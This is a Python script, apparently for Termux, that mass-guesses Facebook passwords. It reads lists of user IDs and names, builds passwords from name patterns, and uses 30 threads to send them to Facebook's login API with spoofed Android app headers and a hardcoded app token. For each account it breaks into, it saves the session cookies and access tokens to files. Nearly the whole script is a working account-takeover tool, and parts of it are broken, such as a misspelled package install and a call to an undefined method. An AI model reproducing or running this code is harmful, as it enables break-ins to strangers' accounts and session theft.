import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp
#_________[ INSTALLING REQUESTS ]_____
'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)
if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"
elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:
	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")

'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)
from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'


def line():
	print(51*'-')
def p(x):
	print(x)


id = []
ok = []
cp = []
loop = 0
method=[]

SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()

def logo():
	os.system('clear')
	logo = (f'''\033[0;32m
	
 _______  _______  _______  _______ _________
(  ___  )(  ____ \(       )(  ___  )\__   __/
| (   ) || (    \/| () () || (   ) |   ) (   
| (___) || (_____ | || || || (___) |   | |   
|  ___  |(_____  )| |(_)| ||  ___  |   | |   
| (   ) |      ) || |   | || (   ) |   | |   
| )   ( |/\____) || )   ( || )   ( |   | |   
|/     \|\_______)|/     \||/     \|   )_(   
                                            
 
\33[1;97m---------------------------------------------------
 \33[1;97m OWNER     >>    ASMAT
 \33[1;97m GITHUB    >>    HAVEELI PE AJANA
 \33[1;97m TOOL      >>    UNDER TEST
  \33[1;97mVERSION   >>    0.1
\33[1;97m--------------------------------------------------''')

	p(logo)

def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""



bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string


def iAmMethod3Ua():
	ua = ("[FBAN/FB4A;FBAV/127.0.0.82.177;FBBV/25752143;FBDM/{density=5.5,width=1305,height=1203};FBLC/en_GB;FBRV/60223033;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A325M;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/312.0.0.82.85;FBBV/50329114;FBDM/{density=3.3,width=1431,height=1181};FBLC/en_PK;FBRV/17235898;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9350;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/45.0.0.95.3;FBBV/61762405;FBDM/{density=6.9,width=953,height=1100};FBLC/en_US;FBRV/16572568;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A260G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/430.0.0.93.139;FBBV/49579996;FBDM/{density=1.8,width=536,height=2040};FBLC/en_GB;FBRV/73713661;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A115A;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/424.0.0.34.16;FBBV/95684483;FBDM/{density=4.6,width=1236,height=2875};FBLC/en_GB;FBRV/27675340;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G720N0;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/278.0.0.72.53;FBBV/78762799;FBDM/{density=9.4,width=1253,height=1535};FBLC/en_GB;FBRV/96676729;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A710F;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/21.0.0.93.8;FBBV/83363006;FBDM/{density=3.6,width=1146,height=2521};FBLC/en_US;FBRV/92249688;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G615F;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/26.0.0.6.57;FBBV/58308502;FBDM/{density=3.8,width=989,height=1887};FBLC/en_PK;FBRV/47213973;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G887F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/79.0.0.23.167;FBBV/71278132;FBDM/{density=3.6,width=562,height=1536};FBLC/en_GB;FBRV/96509335;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T1;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/94.0.0.50.93;FBBV/34034804;FBDM/{density=5.3,width=1304,height=1683};FBLC/en_GB;FBRV/69404999;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A226BR;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/200.0.0.62.49;FBBV/89901406;FBDM/{density=4.3,width=784,height=2411};FBLC/en_GB;FBRV/19003656;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G390F;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/53.0.0.66.178;FBBV/78550811;FBDM/{density=7.5,width=757,height=2974};FBLC/en_PK;FBRV/68350253;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930F;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/185.0.0.88.50;FBBV/73352806;FBDM/{density=4.2,width=1288,height=1840};FBLC/en_PK;FBRV/74984349;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A325F;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/90.0.0.23.25;FBBV/64633412;FBDM/{density=1.9,width=517,height=2261};FBLC/en_GB;FBRV/72002554;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A6050;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/104.0.0.47.45;FBBV/14635042;FBDM/{density=3.1,width=1350,height=1375};FBLC/en_PK;FBRV/30176991;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N975F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/243.0.0.51.54;FBBV/33678597;FBDM/{density=1.7,width=928,height=1234};FBLC/en_US;FBRV/76912606;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9650;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/427.0.0.26.193;FBBV/80651884;FBDM/{density=1.5,width=556,height=1727};FBLC/en_GB;FBRV/96343781;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S908B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/250.0.0.56.26;FBBV/28355857;FBDM/{density=3.2,width=661,height=2015};FBLC/en_US;FBRV/59866843;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930A;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/64.0.0.75.160;FBBV/28875412;FBDM/{density=3.5,width=1320,height=2317};FBLC/en_US;FBRV/68597015;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G901F;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/176.0.0.34.111;FBBV/11247662;FBDM/{density=5.3,width=991,height=1555};FBLC/en_GB;FBRV/18968250;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M205F;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/342.0.0.34.35;FBBV/19355331;FBDM/{density=3.4,width=1247,height=1316};FBLC/en_PK;FBRV/82259405;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327AZ;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/357.0.0.65.162;FBBV/91597753;FBDM/{density=7.8,width=559,height=2303};FBLC/en_GB;FBRV/28023059;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A725F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/296.0.0.45.106;FBBV/78816053;FBDM/{density=4.2,width=1379,height=1842};FBLC/en_US;FBRV/82403206;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G361F;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/331.0.0.52.54;FBBV/21234606;FBDM/{density=3.3,width=987,height=1441};FBLC/en_GB;FBRV/54078861;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915S;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/373.0.0.83.103;FBBV/58266285;FBDM/{density=7.9,width=1010,height=1374};FBLC/en_PK;FBRV/63689949;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A3051;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/424.0.0.60.166;FBBV/12876542;FBDM/{density=3.2,width=1412,height=1968};FBLC/en_US;FBRV/68824197;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M105M;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/408.0.0.40.22;FBBV/27942713;FBDM/{density=4.4,width=765,height=1638};FBLC/en_GB;FBRV/33820071;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J500M;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/393.0.0.44.147;FBBV/99775033;FBDM/{density=8.4,width=1356,height=2309};FBLC/en_PK;FBRV/86100324;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M105F;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/289.0.0.27.150;FBBV/39993694;FBDM/{density=1.3,width=935,height=2049};FBLC/en_PK;FBRV/29392584;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200F;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/71.0.0.15.123;FBBV/27700859;FBDM/{density=6.8,width=889,height=2541};FBLC/en_GB;FBRV/80100839;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313H;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/277.0.0.10.68;FBBV/45221680;FBDM/{density=5.3,width=1044,height=2322};FBLC/en_PK;FBRV/31639622;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410G;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/167.0.0.97.176;FBBV/73831117;FBDM/{density=6.4,width=866,height=1272};FBLC/en_US;FBRV/33307152;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G390F;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/326.0.0.54.143;FBBV/43978274;FBDM/{density=8.7,width=595,height=1896};FBLC/en_PK;FBRV/90881363;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9150;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/66.0.0.39.92;FBBV/58781087;FBDM/{density=8.3,width=873,height=2995};FBLC/en_PK;FBRV/96448411;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E7009;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]")
	return ua
	

nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))

class iAmMain:


	def __init__(self):
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):

		logo()

		p(" [1] File Cloning ")
		p(" [E] Exit Tool ")
		line()

		opt1 = input(" {•} Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.num_menu()
		elif opt1 == "E":exit(" [•] HAVE A NICE DAY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()


	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/File.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()

	def method_select(self,id):
		logo()
		p(" [1] Method (Old & New) ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("iii")
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should Be Under 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Password Example : First Last, First123, Last123, First786 ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p(" Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):

		line()
		p(" [•] Cloning Has Been Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()
		
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}

				headers = {'User-Agent': iAmMethod3Ua(),

'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ASMAT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ASMAT_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
		self.iAmPasswordManager()
if __name__=="__main__":
	#update()
	iAmMain().iAmMenu() 
